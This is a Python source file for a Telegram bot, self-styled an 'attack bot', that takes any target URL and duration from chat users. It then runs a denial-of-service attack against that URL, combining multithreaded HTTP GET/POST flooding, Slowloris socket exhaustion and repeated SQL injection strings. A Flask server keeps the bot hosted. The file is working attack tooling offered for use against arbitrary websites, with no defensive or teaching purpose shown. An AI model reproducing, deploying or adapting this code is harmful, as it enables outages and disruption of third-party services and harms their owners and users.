import telebot
import requests
import threading
import time
import random
import os
import socket
from flask import Flask

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    exit()

bot = telebot.TeleBot(BOT_TOKEN)

# ========== FLASK WEB SERVER ==========
app = Flask(__name__)

@app.route('/')
def home():
    return "🔥 OGGY BHAI BOT IS RUNNING!"

@app.route('/ping')
def ping():
    return "PONG!"

def run_server():
    app.run(host='0.0.0.0', port=8080)

# ========== BOT COMMANDS ==========
@bot.message_handler(commands=['start', 'help'])
def welcome(msg):
    bot.reply_to(msg, """
🔥 **OGGY BHAI – ATTACK BOT AKTIVE** 🔥

Commands:
/attack - Start attack
/status - Check status
/stop - Stop attacks
/owner - Owner info
""")

@bot.message_handler(commands=['owner'])
def owner(msg):
    bot.reply_to(msg, "👑 **Owner:** @BGMI_MAIN")

@bot.message_handler(commands=['attack'])
def attack_cmd(msg):
    m = bot.reply_to(msg, "🎯 **Enter target URL:**")
    bot.register_next_step_handler(m, get_url)

def get_url(msg):
    url = msg.text.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    m = bot.reply_to(msg, f"✅ Target: {url}\n⏱️ **Enter duration (seconds):**")
    bot.register_next_step_handler(m, lambda x: get_duration(x, url))

def get_duration(msg, url):
    try:
        duration = int(msg.text.strip())
        if duration < 5:
            bot.reply_to(msg, "❌ Min 5 seconds!")
            return
        bot.reply_to(msg, f"🔥 Attack starting in 5s...")
        time.sleep(5)
        start_attack(msg, url, duration)
    except:
        bot.reply_to(msg, "❌ Invalid number!")

# ========== ATTACK ENGINE ==========
attack_active = {}
request_count = {}

def start_attack(msg, url, duration):
    cid = msg.chat.id
    aid = f"{cid}_{int(time.time())}"
    
    bot.reply_to(msg, f"""
💀 **ATTACK LAUNCHED** 💀
🎯 {url}
⏱️ {duration}s
⚡ OGGY BHAI IS DESTROYING!
""")
    
    attack_active[aid] = True
    request_count[aid] = 0
    
    # Start threads
    for _ in range(30):
        threading.Thread(target=http_flood, args=(url, aid), daemon=True).start()
    for _ in range(10):
        threading.Thread(target=slowloris, args=(url, aid), daemon=True).start()
    for _ in range(5):
        threading.Thread(target=sql_flood, args=(url, aid), daemon=True).start()
    
    def auto_stop():
        time.sleep(duration)
        attack_active[aid] = False
        bot.send_message(cid, f"""
✅ **ATTACK STOPPED** ✅
📊 Total requests: {request_count.get(aid, 0)}
💀 Target is dead!
""")
    
    threading.Thread(target=auto_stop, daemon=True).start()

def http_flood(url, aid):
    while attack_active.get(aid, False):
        try:
            requests.get(url, timeout=1)
            requests.post(url, data={"a": "A"*5000}, timeout=1)
            request_count[aid] = request_count.get(aid, 0) + 2
        except:
            pass

def slowloris(url, aid):
    try:
        host = url.replace('http://', '').replace('https://', '').split('/')[0]
        port = 443 if url.startswith('https') else 80
        while attack_active.get(aid, False):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(f"Host: {host}\r\n".encode())
                while attack_active.get(aid, False):
                    s.send(b"X-Header: A"*500 + b"\r\n")
                    time.sleep(5)
            except:
                pass
    except:
        pass

def sql_flood(url, aid):
    payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "' AND SLEEP(5)--"]
    while attack_active.get(aid, False):
        try:
            for p in payloads:
                requests.get(f"{url}?id={p}", timeout=1)
        except:
            pass

@bot.message_handler(commands=['stop'])
def stop_all(msg):
    cid = str(msg.chat.id)
    for aid in list(attack_active.keys()):
        if aid.startswith(cid):
            attack_active[aid] = False
    bot.reply_to(msg, "✅ All attacks stopped!")

@bot.message_handler(commands=['status'])
def status_cmd(msg):
    cid = str(msg.chat.id)
    active = [a for a in attack_active if attack_active[a] and a.startswith(cid)]
    if active:
        total = sum(request_count.get(a, 0) for a in active)
        bot.reply_to(msg, f"🟢 Active: {len(active)}\n📈 Requests: {total}")
    else:
        bot.reply_to(msg, "❌ No active attacks.")

# ========== MAIN ==========
if __name__ == "__main__":
    # Start Flask server
    threading.Thread(target=run_server, daemon=True).start()
    
    print("🔥 OGGY BHAI – ATTACK BOT STARTED 🔥")
    print("💀 Ready to destroy targets!")
    
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
